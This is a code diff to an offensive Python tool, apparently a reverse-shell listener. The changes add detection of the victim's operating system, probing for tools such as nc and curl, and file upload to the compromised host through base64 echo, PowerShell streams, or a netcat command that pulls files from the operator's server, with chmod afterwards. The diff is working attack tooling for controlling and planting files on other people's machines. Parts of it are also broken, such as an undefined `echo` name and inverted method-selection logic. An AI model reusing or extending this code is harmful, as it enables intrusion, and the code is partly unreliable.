@@ -5,6 +5,7 @@ import os
 import sys
 import pty
 import util
+import upload_file
 import time
 import random
 import threading
@@ -31,6 +32,7 @@ class ShellListener:
         self.connection = None
         self.on_connect = None
         self.features = set()
+        self.os = None # we need a way to find the OS here
 
     def startBackground(self):
         self.listen_thread = threading.Thread(target=self.start)
@@ -41,11 +43,14 @@ class ShellListener:
         return feature.lower() in self.features
 
     def probe_features(self):
-        features = ["wget", "curl", "nc", "sudo", "telnet", "docker", "python"]
-        for feature in features:
-            output = self.exec_sync("whereis " + feature)
-            if output.startswith(feature.encode() + b": ") and len(output) >= len(feature)+2:
-                self.features.add(feature.lower())
+        if self.os == "unix":
+            features = ["wget", "curl", "nc", "sudo", "telnet", "docker", "python"]
+            for feature in features:
+                output = self.exec_sync("whereis " + feature)
+                if output.startswith(feature.encode() + b": ") and len(output) >= len(feature)+2:
+                    self.features.add(feature.lower())
+        else:
+            print("[-] Can't probe features for os:", self.os)
             
     def get_features(self):
         return self.features
@@ -62,16 +67,33 @@ class ShellListener:
 
                 if self.on_connect:
                     self.on_connect(addr)
-
+          
+                got_first_prompt = False
                 while self.running:
                     data = self.connection.recv(1024)
                     if not data:
                         break
+                    
+                    if self.os is None and not got_first_prompt:
+                        if b"Windows PowerShell" in data:
+                            self.os = "win"
+                        elif b"bash" in data or b"sh" in data:
+                            self.os = "unix"
+                        
+                        if self.os and self.verbose:
+                            print("OS PROBED:", self.os)
+
                     if self.verbose:
                         print("< ", data)
-                    for callback in self.on_message:
-                        callback(data)
-                        
+
+                    if got_first_prompt:  # TODO: check this...
+                        for callback in self.on_message:
+                            callback(data)
+                    elif self.is_prompt(data):
+                        got_first_prompt = True
+                        if self.verbose:
+                            print("RECV first prompt")
+
             print("[-] Disconnected")
             self.connection = None
 
@@ -96,7 +118,23 @@ class ShellListener:
         data += b"\n"
         return self.send(data)
 
+    def is_prompt(self, data):
+        if self.os == "unix":
+            if data.endswith(b"# ") or data.endswith(b"$ "):
+                return True
+        elif self.os == "win":
+            if data.endswith(b"> "):
+                return True
+        
+        return False
+
     def exec_sync(self, cmd):
+
+        if self.os is None:
+            print("[-] OS not probed yet, waiting...")
+            while self.os is None:
+                time.sleep(0.1)
+
         output = b""
         complete = False
 
@@ -111,12 +149,17 @@ class ShellListener:
                 return
 
             output += data
-            if data.endswith(b"# ") or data.endswith(b"$ "):
+            if self.is_prompt(output):
                 complete = True
-                if b"\n" in output:
-                    output = output[0:output.rindex(b"\n")]
-                if output.startswith(cmd + b"\n"):
-                    output = output[len(cmd)+1:]
+                if self.os == "unix":
+                    line_ending = b"\n"
+                elif self.os == "win":
+                    line_ending = b"\r\n"
+
+                if line_ending in output:
+                    output = output[0:output.rindex(line_ending)]
+                if output.startswith(cmd + line_ending):
+                    output = output[len(cmd)+len(line_ending):]                
         
         self.on_message.append(callback)
         self.sendline(cmd)
@@ -140,34 +183,86 @@ class ShellListener:
             time.sleep(0.1)
         return self.running
 
-    def write_file(self, path, data_or_fd, permissions=None):
+    def get_cwd(self):
+        if self.os == "unix":
+            return self.exec_sync("pwd").decode()
+        elif self.os == "win":
+            return self.exec_sync("pwd | foreach {$_.Path}").decode()
+        else:
+            print("[-] get_cwd not implemented for os:", self.os)
+            return None
+
+    def write_file(self, path, data_or_fd, permissions=None, method=None, sync=False, **kwargs):
+
+        if method == None:
+            if self.os == "win":
+                method = "powershell"
+            elif self.os == "unix":
+                method = "echo"
+        else:
+            print("[-] No method specified, assuming 'echo'")
+            method = echo
+
+        send_func = self.sendline if not sync else self.exec_sync
 
         def write_chunk(chunk, first=False):
-            # assume this is unix
             chunk = base64.b64encode(chunk).decode()
-            operator = ">" if first else ">>"
-            self.sendline(f"echo {chunk}|base64 -d {operator} {path}")
+            if method == "powershell":
+                send_func(f"$decodedBytes = [System.Convert]::FromBase64String('{chunk}')")
+                send_func(f"$stream.Write($decodedBytes, 0, $decodedBytes.Length)")
+            else:
+                operator = ">" if first else ">>"
+                send_func(f"echo {chunk}|base64 -d {operator} {path}")
 
-        chunk_size = 1024
-        if hasattr(data_or_fd, "read"):
-            first = True
-            while True:
-                data = data_or_fd.read(chunk_size)
-                if not data:
-                    break
-                if isinstance(data, str):
-                    data = data.encode()
-                write_chunk(data, first)
-                first = False
-            data_or_fd.close()
+        if method == "echo" or method == "powershell":
+
+            if method == "powershell":
+                path = path.replace("'","\\'")
+                send_func(f"$stream = [System.IO.File]::Open('{path}', [System.IO.FileMode]::Create)")
+
+            chunk_size = 1024
+            if hasattr(data_or_fd, "read"):
+                first = True
+                while True:
+                    data = data_or_fd.read(chunk_size)
+                    if not data:
+                        break
+                    if isinstance(data, str):
+                        data = data.encode()
+                    write_chunk(data, first)
+                    first = False
+                data_or_fd.close()
+            else:
+                if isinstance(data_or_fd, str):
+                    data_or_fd = data_or_fd.encode()
+                for offset in range(0, len(data_or_fd), chunk_size):
+                    write_chunk(data_or_fd[offset:chunk_size], offset == 0)
+                    
+            if method == "powershell":
+                send_func(f"$stream.Close()")
+
+        elif method == "nc" or method == "netcat":
+            ip_addr = util.get_address()
+            bin_path = "nc" if not "bin_path" in kwargs else kwargs["bin_path"]
+            port = None if "listen_port" not in kwargs else int(kwargs["listen_port"])
+            sock = util.open_server(ip_addr, port, retry=False)
+            if not sock:
+                return False
+            
+            def serve_file():
+                upload_file.serve_file(sock, data_or_fd, forever=False)
+
+            port = sock.getsockname()[1]
+            upload_thread = threading.Thread(target=serve_file)
+            upload_thread.start()
+            send_func(f"{bin_path} {ip_addr} {port} > {path}")
+            upload_thread.join()
         else:
-            if isinstance(data_or_fd, str):
-                data_or_fd = data_or_fd.encode()
-            for offset in range(0, len(data_or_fd), chunk_size):
-                write_chunk(data_or_fd[offset:chunk_size], offset == 0)
+            print("[-] Unknown write-file method:", method)
+            return False
 
-        if permissions:
-            self.sendline(f"chmod {permissions} {path}")
+        if permissions and self.os == "unix":
+            send_func(f"chmod {permissions} {path}")
 
 class ParamikoTunnelServer(SocketServer.ThreadingTCPServer):
     daemon_threads = True
@@ -367,7 +462,7 @@ if __name__ == "__main__":
     # choose random port
     if listen_port is None:
         listen_port = random.randint(10000,65535)
-        while util.isPortInUse(listen_port):
+        while util.is_port_in_use(listen_port):
             listen_port = random.randint(10000,65535)
 
     payload = generate_payload(payload_type, local_address, listen_port)
